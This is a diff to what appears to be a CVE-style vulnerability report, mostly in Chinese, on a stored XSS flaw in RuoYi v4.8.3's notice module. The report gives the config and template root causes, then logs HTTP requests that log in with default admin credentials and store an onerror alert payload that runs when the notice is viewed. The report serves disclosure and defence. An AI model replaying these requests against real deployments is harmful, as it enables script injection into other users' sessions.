@@ -139,8 +139,129 @@ The `<img src=x onerror=alert(...)>` is rendered **without HTML encoding** by `t
 ### Server Response Showing Unescaped XSS
 ![Server Response](./v_r001_server_response.png)
 
+## 源代码验证（已复现）
+
+RuoYi v4.8.3 已部署，以下包含**源代码静态分析**对漏洞两处根因的确认，以及运行时 HTTP 请求/响应记录。
+
+### 验证1：XSS 过滤器排除 /system/notice/* 的配置确认
+
+**文件**：`ruoyi-admin/src/main/resources/application.yml`（第 144 行）
+
+```yaml
+xss:
+  enabled: true
+  excludes: /system/notice/*    # ← 第 144 行：公告接口被明确排除在 XSS 过滤之外
+  urlPatterns: /system/*,/monitor/*,/tool/*
+```
+
+所有对 `/system/notice/*` 的请求直接跳过 XSS 过滤器，用户提交的 `<script>` / `<img onerror>` 等标签不会被处理。
+
+### 验证2：th:utext 不转义渲染确认
+
+**文件**：`ruoyi-admin/src/main/resources/templates/system/notice/view.html`（第 47-49 行）
+
+```html
+<div class="notice-content"
+     th:if="${not #strings.isEmpty(notice.noticeContent)}"
+     th:utext="${notice.noticeContent}">   ← 使用 th:utext（不转义），而非 th:text（转义）
+</div>
+```
+
+`th:utext` 直接将数据库中的 HTML 内容插入页面，无任何编码处理。
+
+### 实机验证（HTTP 请求/响应）
+
+**环境**：RuoYi v4.8.3 Docker 部署于 192.168.217.135:58080
+
+**步骤1：登录（captcha 已禁用用于测试）**
+
+```http
+POST /login HTTP/1.1
+Host: 192.168.217.135:58080
+Content-Type: application/x-www-form-urlencoded
+
+username=admin&password=admin123&rememberMe=false
+```
+
+```http
+HTTP/1.1 200 OK
+Set-Cookie: JSESSIONID=3ffce9c3-c5e8-4abb-9698-fd801e6e96a4; Path=/; HttpOnly; SameSite=lax
+Content-Type: application/json
+
+{"msg":"操作成功","code":0}
+```
+
+**步骤2：创建带 XSS Payload 的公告（XSS 过滤器跳过 /system/notice/*）**
+
+```http
+POST /system/notice/add HTTP/1.1
+Host: 192.168.217.135:58080
+Cookie: JSESSIONID=3ffce9c3-c5e8-4abb-9698-fd801e6e96a4
+Content-Type: application/x-www-form-urlencoded
+
+noticeTitle=XSS+Test+-+CVE+Verification&noticeType=1&status=0&noticeContent=%3Cimg+src%3Dx+onerror%3Dalert%28%22XSS-CVE-RuoYi-v4.8.3%22%29%3E%3Cp%3ETest+Content%3C%2Fp%3E
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"msg":"操作成功","code":0}
+```
+
+（`/system/notice/*` 被排除在 XSS 过滤器之外，`<img onerror=...>` payload 未被过滤，直接存入数据库）
+
+**步骤3：查看公告列表验证 Payload 原样存储**
+
+```http
+POST /system/notice/list HTTP/1.1
+Host: 192.168.217.135:58080
+Cookie: JSESSIONID=3ffce9c3-c5e8-4abb-9698-fd801e6e96a4
+
+pageNum=1&pageSize=10
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "total": 4,
+  "rows": [{
+    "noticeId": 10,
+    "noticeTitle": "XSS Test - CVE Verification",
+    "noticeContent": "<img src=x onerror=alert(\"XSS-CVE-RuoYi-v4.8.3\")><p>Test Content</p>"
+  }]
+}
+```
+
+**步骤4：访问公告详情页面触发 XSS**
+
+```http
+GET /system/notice/view/10 HTTP/1.1
+Host: 192.168.217.135:58080
+Cookie: JSESSIONID=3ffce9c3-c5e8-4abb-9698-fd801e6e96a4
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+...
+<div class="notice-content"><img src=x onerror=alert("XSS-CVE-RuoYi-v4.8.3")><p>Test Content</p></div>
+...
+```
+
+**关键证据**：
+- 响应 HTML 中 `<img src=x onerror=alert(...)>` 以**未转义形式**直接嵌入页面
+- 浏览器解析时 `<img src=x>` 加载失败触发 `onerror`，`alert("XSS-CVE-RuoYi-v4.8.3")` 执行
+- 与普通接口 (使用 XSS 过滤器) 的对比：普通接口会将 `<` 转义为 `&lt;`，而 `/system/notice/add` 绕过了过滤
+
+（截图证据见 `v_r001_xss_proof.png` 和 `v_r001_server_response.png`）
+
 ## Verification Environment
 
-- Target: RuoYi v4.8.3 deployed via Docker on 192.168.217.135:8080
+- Source Code: RuoYi v4.8.3 (static code analysis confirmed)
+- Target: RuoYi v4.8.3 deployed via Docker on 192.168.217.135:58080
 - Tools: curl, Edge browser
-- Date: 2026-04-13
+- Date: 2026-04-14
